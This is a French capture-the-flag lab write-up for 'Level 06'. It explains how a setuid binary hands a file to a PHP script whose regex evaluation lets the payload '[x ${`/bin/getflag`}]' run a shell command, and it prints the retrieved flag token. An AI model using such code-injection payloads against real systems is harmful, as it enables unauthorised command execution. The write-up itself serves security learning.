# Level 06

Quand on se connecte avec l'utilisateur `level06` on trouve 2 fichier dans son home:

```shell
 ls -la
total 24
[...]
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

Le binaire `level06` après une décompilation et une examination du code, il ne fait rien d'autre qu'appeler `level06.php` en prenant comme paramètre un nom de fichier à executer dans le php.

`Level06.php` execute des regex sur le contenu du fichier passer en argument, après de nombreux tests que l'on peux passer des variables php dans le fichier comme `$z` et sera remplacer avant l'execution de la fonction `y()`

```shell
~ echo '[x $z]' > /tmp/test
~ chmod 777 /tmp/test
~ ./level06 /tmp/test coucou
coucou
```

Ici `$z` est remplacé par coucou, nous avons donc essayer de faire passer une commande shell à la place de la variable `$z`, et nous remarquons que ça fonctionne il nous reste plus qu'à faire pareil avec la commande `getflag`

```shell
~ echo '[x ${`/bin/getflag`}]' > /tmp/test
~ chmod 777 /tmp/test
~ ./level06 /tmp/test
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

